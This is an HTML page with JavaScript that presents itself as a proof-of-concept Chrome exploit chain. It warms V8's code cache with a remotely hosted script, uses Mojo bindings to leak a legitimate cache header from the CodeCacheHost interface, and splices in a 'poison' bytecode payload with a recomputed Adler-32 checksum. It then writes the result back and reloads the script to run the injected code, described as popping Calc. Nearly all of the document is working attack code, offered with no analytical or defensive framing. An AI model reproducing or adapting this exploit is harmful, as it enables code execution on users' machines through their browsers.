<!DOCTYPE html>
<html>
<head>
    <title>Dynamic V8 Sandbox Escape - Remote PoC</title>
</head>
<body>
    <h1>Stable Chrome RCE4 Chain</h1>
    <p>Status: <b id="status">Ready</b></p>
    <button id="launch">Launch Full Chain</button>

    <script>
        const TARGET_URL = "https://linux-1723.github.io/test/exploit.js";
        const PAYLOAD_PATH = "poison.bin";

        // V8 Adler-32 Integrity Checksum
        function adler32(data) {
            let a = 1, b = 0;
            for (let i = 0; i < data.length; i++) {
                a = (a + data[i]) % 65521;
                b = (b + a) % 65521;
            }
            return (b << 16) | a;
        }

        async function pwn() {
            const status = document.getElementById('status');
            status.innerText = "Step 1: Priming the V8 Cache (Loading Fat Bait)...";

            // WARM-UP: Force V8 to compile and cache the script
            const primerScript = document.createElement('script');
            primerScript.src = TARGET_URL;
            document.body.appendChild(primerScript);

            // Wait 2.5 seconds for Chrome's background thread to write the cache to disk
            setTimeout(async () => {
                status.innerText = "Step 2: Fetching Poison Payload...";
                
                const poisonResp = await fetch(PAYLOAD_PATH);
                const poisonBytecode = new Uint8Array(await poisonResp.arrayBuffer());

                // Setup Mojo
                const pipe = Mojo.createMessagePipe();
                Mojo.bindInterface('blink.mojom.CodeCacheHost', pipe.handle1);
                const host = pipe.handle0;

                // THE HEIST
                status.innerText = "Step 3: Leaking V8 Header via Mojo...";
                
                const fetchMsg = new ArrayBuffer(128); 
                const fv = new DataView(fetchMsg);
                
                fv.setUint32(0, 32, true);  fv.setUint32(4, 1, true);   
                fv.setUint32(8, 0, true);   fv.setUint32(12, 3, true);  
                fv.setUint32(16, 1, true);  fv.setUint32(20, 0, true);  
                fv.setBigUint64(24, 1n, true); 

                fv.setUint32(32, 24, true); fv.setUint32(36, 0, true);  
                fv.setUint32(40, 0, true);  fv.setUint32(44, 0, true);  
                fv.setBigUint64(48, 8n, true); 

                fv.setUint32(56, 16, true); fv.setUint32(60, 0, true);  
                fv.setBigUint64(64, 8n, true); 

                fv.setUint32(72, 56, true); 
                fv.setUint32(76, TARGET_URL.length, true); 
                for(let i=0; i<TARGET_URL.length; i++) {
                    fv.setUint8(80+i, TARGET_URL.charCodeAt(i)); 
                }
                
                host.writeMessage(fetchMsg, []);

                // WATCHER
                const result = await host.readMessage();
                if (!result.handles || result.handles.length === 0) {
                    status.innerText = "FAIL: Browser still refused to cache the file. Make exploit.js bigger!";
                    return;
                }

                status.innerText = "Step 4: Header Stolen! Patching Checksums...";
                const handle = result.handles[0];
                const sharedMem = handle.mapBuffer(0, 32);
                const legitHeader = new Uint8Array(sharedMem.buffer).slice(0, 32);

                let finalPayload = new Uint8Array(32 + poisonBytecode.length);
                finalPayload.set(legitHeader, 0);
                finalPayload.set(poisonBytecode, 32);

                const pv = new DataView(finalPayload.buffer);
                pv.setUint32(20, poisonBytecode.length, true); 
                pv.setUint32(24, adler32(poisonBytecode), true); 

                // RE-POISON
                status.innerText = "Step 5: Poisoning Browser Cache...";
                const bufferSize = finalPayload.byteLength;
                const sharedBuffer = Mojo.createSharedBuffer(bufferSize);
                const mapping = sharedBuffer.handle.mapBuffer(0, bufferSize);
                new Uint8Array(mapping.buffer).set(finalPayload);

                // Sync Time for the security check
                const targetResp = await fetch(TARGET_URL, {cache: "reload"});
                const jsTimeMs = new Date(targetResp.headers.get('date')).getTime();
                const chromeTime = BigInt(jsTimeMs + 11644473600000) * 1000n;

                const msg = new ArrayBuffer(184);
                const v = new DataView(msg);
                v.setUint32(0, 24, true); v.setUint32(12, 1, true); 
                v.setUint32(24, 48, true); v.setBigUint64(40, 32n, true); v.setBigUint64(48, 96n, true);
                v.setUint32(56, 16, true); v.setUint32(60, 1, true); v.setBigUint64(64, 96n, true);
                v.setUint32(72, 16, true); v.setBigUint64(80, 8n, true);
                v.setUint32(88, 56, true); v.setUint32(92, TARGET_URL.length, true);
                for(let i=0; i<TARGET_URL.length; i++) v.setUint8(96+i, TARGET_URL.charCodeAt(i));
                v.setUint32(144, 16, true); v.setBigUint64(152, chromeTime, true);
                v.setUint32(160, 16, true); v.setUint32(168, 0, true); v.setUint32(172, bufferSize, true);

                host.writeMessage(msg, [sharedBuffer.handle]);

                status.innerText = "Step 6: Detonating! Watch for Calc...";
                setTimeout(() => {
                    const s = document.createElement('script');
                    s.src = TARGET_URL;
                    document.body.appendChild(s);
                }, 1000);

            }, 2500); // 2.5 second delay
        }

        document.getElementById('launch').onclick = pwn;
    </script>
</body>
</html>
